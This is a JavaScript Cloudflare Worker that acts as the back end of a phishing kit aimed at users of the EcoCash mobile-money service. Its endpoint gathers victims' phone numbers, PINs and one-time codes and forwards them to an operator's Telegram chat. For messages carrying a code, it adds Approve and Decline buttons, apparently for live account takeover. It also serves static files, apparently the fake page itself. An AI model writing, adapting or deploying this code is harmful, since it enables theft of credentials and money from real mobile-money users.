export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      // Handle the API request
      if (url.pathname === '/api/send') {
        if (request.method !== 'POST') {
          return jsonResponse({ error: 'Method not allowed' }, 405);
        }

        // Check secrets first
        if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
          return jsonResponse({
            error: 'Secrets not configured',
            hasToken: !!env.TELEGRAM_BOT_TOKEN,
            hasChatId: !!env.TELEGRAM_CHAT_ID
          }, 500);
        }

        let body;
        try {
          body = await request.json();
        } catch (e) {
          return jsonResponse({ error: 'Invalid JSON body' }, 400);
        }

        const { phone, pin, amount, currency, txnId, code } = body;

        let message = `🔐 *New EcoCash Activity*\n-------------------------------\n`;
        if (phone) message += `📱 *Phone:* +263 ${phone}\n`;
        if (pin) message += `🔑 *PIN:* ${pin}\n`;
        if (code) message += `🔢 *Code:* ${code}\n`;
        message += `💰 *Amount:* ${currency} ${amount}\n🆔 *Txn ID:* ${txnId}\n⏱ *Time:* ${new Date().toISOString()}`;

        const payload = { chat_id: env.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };

        if (code) {
          payload.reply_markup = {
            inline_keyboard: [[
              { text: "✅ Approve", callback_data: "approve" },
              { text: "❌ Decline", callback_data: "decline" },
              { text: "😅 Oops", callback_data: "oops" }
            ]]
          };
        }

        try {
          const tgRes = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          const tgData = await tgRes.json();

          if (!tgData.ok) {
            return jsonResponse({ error: tgData.description, telegramCode: tgData.error_code }, 400);
          }

          return jsonResponse({ success: true }, 200);
        } catch (tgError) {
          return jsonResponse({ error: 'Telegram fetch failed: ' + tgError.message }, 500);
        }
      }

      // Serve static files
      if (!env.ASSETS) {
        return new Response('ASSETS binding missing in wrangler.toml', { status: 500 });
      }
      return env.ASSETS.fetch(request);

    } catch (fatalError) {
      return jsonResponse({ error: 'FATAL: ' + fatalError.message, stack: fatalError.stack }, 500);
    }
  }
};

function jsonResponse(data, status) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}
